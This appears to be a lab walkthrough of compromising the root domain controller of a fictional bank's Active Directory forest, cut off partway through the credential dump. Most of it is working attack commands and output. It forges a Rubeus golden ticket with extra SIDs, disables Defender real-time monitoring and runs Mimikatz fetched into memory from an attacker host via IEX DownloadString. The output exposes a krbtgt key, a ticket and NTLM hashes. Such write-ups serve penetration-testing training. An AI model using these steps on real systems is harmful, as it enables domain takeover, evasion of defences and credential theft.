---
layout: default
---

## gcb-dc.gcb.local

The jewels of the crown: Root GCB domain of Global Central Bank company
And finally eit possible abuse of child-parent trust relationship between it.gcb.local and gcb.local in order to access to GCB DOmain controller.  


### 1. Abuse of trust child-parent relationship

From it-dc.it.gcb.local download Rubeus :

```
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> wget http://192.168.100.15/Rubeus.exe -OutFile Rubeus.exe
```

With krbtgt ase256 hash credentials of it.gcb.local it's possible request a golden ticket for Domain Administrator with the parent Domain gcb.local:

```
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> .\Rubeus.exe golden /user:Administrator /id:500 /domain:it.gcb.local /sid:S-1-5-21-948911695-1962824894-4291460450  /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:62b85ee1e26d8f98f62090a8ac69a258fd32000ac5d3d4691aea2bbba72a226c  /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : IT.GCB.LOCAL (IT)
[*] SID            : S-1-5-21-948911695-1962824894-4291460450
[*] UserId         : 500
[*] Groups         : 513
[*] ExtraSIDs      : S-1-5-21-2781415573-3701854478-2406986946-519
[*] ServiceKey     : 62B85EE1E26D8F98F62090A8AC69A258FD32000AC5D3D4691AEA2BBBA72A226C
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 62B85EE1E26D8F98F62090A8AC69A258FD32000AC5D3D4691AEA2BBBA72A226C
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : it.gcb.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@it.gcb.local'

[*] AuthTime       : 7/26/2024 5:06:58 AM
[*] StartTime      : 7/26/2024 5:06:58 AM
[*] EndTime        : 7/26/2024 3:06:58 PM
[*] RenewTill      : 8/2/2024 5:06:58 AM

[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
```

### 2. create new session As Domain Admin with Enterprise Admin privileges

```
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> $gcbsession = New-PSSession -ComputerName gcb-dc.gcb.local
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> $gcbsession

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          gcb-dc.gcb.l... RemoteMachine   Opened        Microsoft.PowerShell     Available


```

validate access and privileges to gcb-dc.gcb.local:

```
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> Invoke-Command -ScriptBlock {whoami /all; ipconfig; hostname} -Session $gcbsession

USER INFORMATION
----------------

User Name        SID
================ ============================================
it\administrator S-1-5-21-948911695-1962824894-4291460450-500


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes    
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
GCB\Enterprise Admins                      Group            S-1-5-21-2781415573-3701854478-2406986946-519 Mandatory group, Enabled by default, Enabled group
GCB\Denied RODC Password Replication Group Alias            S-1-5-21-2781415573-3701854478-2406986946-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.4.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.4.254
gcb-dc
```

### 3. Disable AV and extract Enterprise Admin credentials

```
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring 1; Get-MpPreference} -Session $gcbsession


PSComputerName                                        : gcb-dc.gcb.local
RunspaceId                                            : 09c473b2-5e49-41c4-9f3d-b163f1d26659
AllowDatagramProcessingOnWinServer                    : False
AllowNetworkProtectionDownLevel                       : False
AllowNetworkProtectionOnWinServer                     : False
AllowSwitchToAsyncInspection                          : False
ApplyDisableNetworkScanningToIOAV                     : False
AttackSurfaceReductionOnlyExclusions                  :
AttackSurfaceReductionRules_Actions                   :
AttackSurfaceReductionRules_Ids                       :
AttackSurfaceReductionRules_RuleSpecificExclusions    :
AttackSurfaceReductionRules_RuleSpecificExclusions_Id :
CheckForSignaturesBeforeRunningScan                   : False
CloudBlockLevel                                       : 0
CloudExtendedTimeout                                  : 0
ComputerID                                            : 28F432DC-9115-3B22-1244-487AAA480710
ControlledFolderAccessAllowedApplications             :
ControlledFolderAccessProtectedFolders                :
DefinitionUpdatesChannel                              : 0
DisableArchiveScanning                                : False
DisableAutoExclusions                                 : False
DisableBehaviorMonitoring                             : False
DisableBlockAtFirstSeen                               : False
DisableCacheMaintenance                               : False
DisableCatchupFullScan                                : True
DisableCatchupQuickScan                               : True
DisableCpuThrottleOnIdleScans                         : True
DisableDatagramProcessing                             : False
DisableDnsOverTcpParsing                              : False
DisableDnsParsing                                     : False
DisableEmailScanning                                  : True
DisableFtpParsing                                     : False
DisableGradualRelease                                 : False
DisableHttpParsing                                    : False
DisableInboundConnectionFiltering                     : False
DisableIOAVProtection                                 : False
DisableNetworkProtectionPerfTelemetry                 : False
DisablePrivacyMode                                    : False
DisableQuicParsing                                    : False
DisableRdpParsing                                     : False
DisableRealtimeMonitoring                             : True
DisableRemovableDriveScanning                         : True
DisableRestorePoint                                   : True
DisableScanningMappedNetworkDrivesForFullScan         : True
DisableScanningNetworkFiles                           : False
DisableScriptScanning                                 : False
DisableSmtpParsing                                    : False
DisableSshParsing                                     : False
DisableTlsParsing                                     : False
EnableControlledFolderAccess                          : 0
EnableConvertWarnToBlock                              : False
EnableDnsSinkhole                                     : True
EnableFileHashComputation                             : False
EnableFullScanOnBatteryPower                          : False
EnableLowCpuPriority                                  : False
EnableNetworkProtection                               : 0
EngineUpdatesChannel                                  : 0
ExclusionExtension                                    :
ExclusionIpAddress                                    :
ExclusionPath                                         :
ExclusionProcess                                      :
ForceUseProxyOnly                                     : False
HideExclusionsFromLocalUsers                          : True
HighThreatDefaultAction                               : 0
IntelTDTEnabled                                       :
LowThreatDefaultAction                                : 0
MAPSReporting                                         : 2
MeteredConnectionUpdates                              : False
ModerateThreatDefaultAction                           : 0
NetworkProtectionReputationMode                       : 0
OobeEnableRtpAndSigUpdate                             : False
PerformanceModeStatus                                 : 1
PlatformUpdatesChannel                                : 0
ProxyBypass                                           :
ProxyPacUrl                                           :
ProxyServer                                           :
PUAProtection                                         : 0
QuarantinePurgeItemsAfterDelay                        : 90
QuickScanIncludeExclusions                            : 0
RandomizeScheduleTaskTimes                            : True
RealTimeScanDirection                                 : 0
RemediationScheduleDay                                : 0
RemediationScheduleTime                               : 02:00:00
ReportDynamicSignatureDroppedEvent                    : False
ReportingAdditionalActionTimeOut                      : 10080
ReportingCriticalFailureTimeOut                       : 10080
ReportingNonCriticalTimeOut                           : 1440
ScanAvgCPULoadFactor                                  : 50
ScanOnlyIfIdleEnabled                                 : True
ScanParameters                                        : 1
ScanPurgeItemsAfterDelay                              : 15
ScanScheduleDay                                       : 0
ScanScheduleOffset                                    : 120
ScanScheduleQuickScanTime                             : 00:00:00
ScanScheduleTime                                      : 02:00:00
SchedulerRandomizationTime                            : 4
ServiceHealthReportInterval                           : 60
SevereThreatDefaultAction                             : 0
SharedSignaturesPath                                  :
SharedSignaturesPathUpdateAtScheduledTimeOnly         : False
SignatureAuGracePeriod                                : 0
SignatureBlobFileSharesSources                        :
SignatureBlobUpdateInterval                           : 60
SignatureDefinitionUpdateFileSharesSources            :
SignatureDisableUpdateOnStartupWithoutEngine          : False
SignatureFallbackOrder                                : MicrosoftUpdateServer|MMPC
SignatureFirstAuGracePeriod                           : 120
SignatureScheduleDay                                  : 8
SignatureScheduleTime                                 : 01:45:00
SignatureUpdateCatchupInterval                        : 1
SignatureUpdateInterval                               : 0
SubmitSamplesConsent                                  : 0
ThreatIDDefaultAction_Actions                         :
ThreatIDDefaultAction_Ids                             :
ThrottleForScheduledScanOnly                          : True
TrustLabelProtectionStatus                            : 0
UILockdown                                            : False
UnknownThreatDefaultAction                            : 0

```

Extract domain hashes:
```
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> Invoke-Command -ScriptBlock { IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15/Invoke-Mimi.ps1"); Invoke-Mimi -
Command '"privilege::debug" "sekurlsa::logonPasswords" "lsadump::lsa /patch" "exit"' } -Session $gcbsession

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # sekurlsa::logonPasswords

Authentication Id : 0 ; 709460 (00000000:000ad354)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:41 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 49365 (00000000:0000c0d5)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:59 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 31538 (00000000:00007b32)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:59 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 27614 (00000000:00006bde)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               :
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 712131 (00000000:000addc3)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:41 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 31671 (00000000:00007bb7)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:59 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : GCB-DC$
Domain            : GCB
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : gcb-dc$
         * Domain   : GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 711841 (00000000:000adca1)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:41 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 709506 (00000000:000ad382)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:41 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 49315 (00000000:0000c0a3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
